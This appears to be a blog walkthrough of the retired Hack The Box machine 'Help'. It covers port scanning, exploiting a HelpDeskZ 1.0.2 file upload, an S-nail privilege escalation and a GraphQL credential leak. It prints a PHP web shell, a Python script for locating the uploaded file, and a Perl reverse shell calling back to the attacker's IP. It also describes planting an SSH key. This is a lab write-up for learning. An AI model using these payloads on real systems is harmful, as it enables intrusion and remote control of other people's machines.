---
layout: post
title: "Help: Hack The Box Walkthrough"
date: 2019-06-08 16:08:58 +0000
last_modified_at: 2019-06-08 16:10:00 +0000
category: Walkthrough
tags: ["Hack The Box", Help, retired]
comments: true
image:
  feature: help-htb-walkthrough.jpg
  credit: Wokandapix / Pixabay
  creditlink: https://pixabay.com/en/support-letters-scrabble-help-2355701/
---

This post documents the complete walkthrough of Help, a retired vulnerable [VM][1] created by [cymtrick][2], and hosted at [Hack The Box][3]. If you are uncomfortable with spoilers, please stop reading now.
{: .notice}

<!--more-->

## On this post 
{:.no_toc} 

* TOC 
{:toc}

## Background

Help is a retired vulnerable VM from Hack The Box.

## Information Gathering

Let’s start with a `masscan` probe to establish the open ports in the host.

```
# masscan -e tun0 -p1-65535,U:1-65535 10.10.10.121 --rate=1000

Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-01-23 08:22:00 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [131070 ports/host]
Discovered open port 22/tcp on 10.10.10.121
Discovered open port 80/tcp on 10.10.10.121
Discovered open port 3000/tcp on 10.10.10.121
```

`masscan` finds three open ports. Let's do one better with `nmap` scanning the discovered ports.

```
# nmap -n -v -Pn -p22,80,3000 -A --reason 10.10.10.121 -oN nmap.txt
...
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
80/tcp   open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
3000/tcp open  http    syn-ack ttl 63 Node.js Express framework
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
```

We have two `http` services in the form of Apache and Node.js. This is how they look like.

<a class="image-popup">
![d0d5ff90.png](/assets/images/posts/help-htb-walkthrough/d0d5ff90.png)
</a>

<a class="image-popup">
![f881d02b.png](/assets/images/posts/help-htb-walkthrough/f881d02b.png)
</a>

The default Apache page suggests more enumeration needs to be done.

### Directory/File Enumeration

Let's fuzz it with `gobuster` and DirBuster's wordlist just to see what we'll get.

```
# gobuster -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50 -e -u http://10.10.10.121/

=====================================================
Gobuster v2.0.0              OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://10.10.10.121/
[+] Threads      : 50
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
[+] Status codes : 200,204,301,302,307,403
[+] Expanded     : true
[+] Timeout      : 10s
=====================================================
2019/01/23 08:34:06 Starting gobuster
=====================================================
http://10.10.10.121/support (Status: 301)
http://10.10.10.121/javascript (Status: 301)
=====================================================
2019/01/23 08:39:48 Finished
=====================================================
```

I think I've seen enough. Let's pay `/support` a visit.

<a class="image-popup">
![efdf471d.png](/assets/images/posts/help-htb-walkthrough/efdf471d.png)
</a>

Well, well, well. What do we have here? This must be our first attack surface.

### HelpDeskZ 1.0.2 - Unauthenticated Arbitrary File Upload

Searching Google for an exploit in HelpDeskZ led me to EDB-ID [40300](https://www.exploit-db.com/exploits/40300). Anyway, it looks like the site is running the vulnerable version.

<a class="image-popup">
![ab9defc0.png](/assets/images/posts/help-htb-walkthrough/ab9defc0.png)
</a>

According to the exploit, HelpDeskZ suffers from an unauthenticated arbitrary file upload vulnerability where the software allows file attachment with ticket submission. The minor problem lies with determining the filename of the uploaded file. However, because the eventual file name depends on the time the file was uploaded, we can make an educated guess of the timestamp by shaving a couple of seconds from the current time.

Let's submit a fake ticket and attach `test.php`, which is nothing more than the following PHP code.

```
<pre>
<?php echo shell_exec($_GET[0]); ?>
</pre>
```

<a class="image-popup">
![f5e7fc4c.png](/assets/images/posts/help-htb-walkthrough/f5e7fc4c.png)
</a>

<a class="image-popup">
![9687e6bb.png](/assets/images/posts/help-htb-walkthrough/9687e6bb.png)
</a>

Hmm. It says "File is not allowed". Is that so? Let's take a look at the source code controlling this behavior.

```php
if(!isset($error_msg) && $settings['ticket_attachment']==1){
  $uploaddir = UPLOAD_DIR.'tickets/';   
  if($_FILES['attachment']['error'] == 0){
    $ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
    $filename = md5($_FILES['attachment']['name'].time()).".".$ext;
    $fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
    $uploadedfile = $uploaddir.$filename;
    if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
      $show_step2 = true;
      $error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
    }else{
      $fileverification = verifyAttachment($_FILES['attachment']);
      switch($fileverification['msg_code']){
        case '1':
        $show_step2 = true;
        $error_msg = $LANG['INVALID_FILE_EXTENSION'];
        break;
        case '2':
        $show_step2 = true;
        $error_msg = $LANG['FILE_NOT_ALLOWED'];
        break;
        case '3':
        $show_step2 = true;
        $error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
        break;
      }
    }
  }
}

```

Two things worth nothing here. First of all, the final upload directory ends with `tickets/`. Second, regardless of the file verification results, the submission will ALWAYS progress to step 2 after the file has been uploaded.

In the words of POTUS: Fake News!

...

Where is the upload directory? If I have to guess, I would say the actual upload directory is like this:

```
http://10.10.10.121/support/uploads/tickets/
```

_I cheated a bit. I actually enumerated the site for directories at a deeper level._ :laughing:

Now, let's re-purpose the exploit code and make it more adaptive to file extensions.

<div class="filename"><span>exploit.py</span></div>

```python
'''
Usage: python exploit.py http://10.10.10.121/support/uploads/tickets/ test.php
'''

import hashlib
import time
import sys
import requests

print 'Helpdeskz v1.0.2 - Unauthenticated shell upload exploit'

if len(sys.argv) < 3:
    print "Usage: {} [baseUrl] [nameOfUploadedFile]".format(sys.argv[0])
    sys.exit(1)

helpdeskzBaseUrl = sys.argv[1]
fileName = sys.argv[2]
extension = fileName.split(".")[-1]

currentTime = int(time.time())

for x in range(0, 300):
    plaintext = fileName + str(currentTime - x)
    md5hash = hashlib.md5(plaintext).hexdigest()

    url = helpdeskzBaseUrl + md5hash + '.' + extension
    response = requests.head(url)
    if response.status_code == 200:
        print "found!"
        print url
        sys.exit(0)

print "Sorry, I did not find anything"
```

Armed with the insight gleaned from the source code, let's upload again and find out where it's uploaded to.

<a class="image-popup">
![b88c841c.png](/assets/images/posts/help-htb-walkthrough/b88c841c.png)
</a>

<a class="image-popup">
![772cc8ce.png](/assets/images/posts/help-htb-walkthrough/772cc8ce.png)
</a>

Awesome.

Let's urlencode the following reverse shell in Perl.

```
perl -e 'use Socket;$i="10.10.14.169";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

<a class="image-popup">
![7f0bcfe9.png](/assets/images/posts/help-htb-walkthrough/7f0bcfe9.png)
</a>

Perfect. Let's [upgrade](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) the shell to a full TTY.

The file `user.txt` is at `help`'s home directory.

<a class="image-popup">
![2ae85f72.png](/assets/images/posts/help-htb-walkthrough/2ae85f72.png)
</a>

## Privilege Escalation

During enumeration of `help`'s account, I notice that the box is using a vulnerable version of S-nail.

<a class="image-popup">
![5dcd5da6.png](/assets/images/posts/help-htb-walkthrough/5dcd5da6.png)
</a>

<a class="image-popup">
![6c350cff.png](/assets/images/posts/help-htb-walkthrough/6c350cff.png)
</a>

The vulnerability is tagged [CVE-2017-5899](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5899).

Long story short, I found the perfect [exploit](https://github.com/bcoles/local-exploits/blob/master/CVE-2017-5899/exploit.sh) in GitHub.

Simply copy over the exploit to the box. (There are several ways to do that.) I chose to mark my territory by putting a SSH public key I control to `/home/help/.ssh/authorized_keys`.

Once that's done, launch the script.

<a class="image-popup">
![f6a1af65.png](/assets/images/posts/help-htb-walkthrough/f6a1af65.png)
</a>

The file `root.txt` can be easily retrieved with a `root` shell.

<a class="image-popup">
![f490e19d.png](/assets/images/posts/help-htb-walkthrough/f490e19d.png)
</a>

:dancer:

## Afterthought

I was intrigued by the message that there's a way to retrieve credentials by providing the right query. Turns out the Node.js service was running GraphQL, an open-source data query and manipulation language for APIs. I'm familiar with REST but not GraphQL so this is an execellent opportunity to learn something about it.

I use the Firefox Add-on Altair GraphQL Client to query the endpoint `http://10.10.10.121:3000/graphql`.

<a class="image-popup">
![1fbce97d.png](/assets/images/posts/help-htb-walkthrough/1fbce97d.png)
</a>

Boom. It's that easy. Let you in for a secret—the password can be found with a Google search. :information_desk_person:

[1]: https://www.hackthebox.eu/home/machines/profile/170
[2]: https://www.hackthebox.eu/home/users/profile/3079
[3]: https://www.hackthebox.eu/
